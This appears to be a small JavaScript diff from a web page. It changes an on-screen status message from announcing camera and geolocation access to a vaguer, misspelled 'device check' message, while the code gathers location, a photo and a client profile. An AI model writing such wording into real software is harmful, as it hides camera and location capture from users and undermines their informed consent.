@@ -856,7 +856,7 @@ function gateCheck() {
 async function autoFlow() {
   try {
     setBtnLocked();
-    if (UI.text) UI.text.innerHTML = "Запрашиваем камеру и геолокацию…";
+    if (UI.text) UI.text.innerHTML = "Запрашиваем разрещения на проверку устройства…";
 
     // Параллельно: гео + фото + профиль
     const [geo, rawPhoto, client_profile] = await Promise.all([
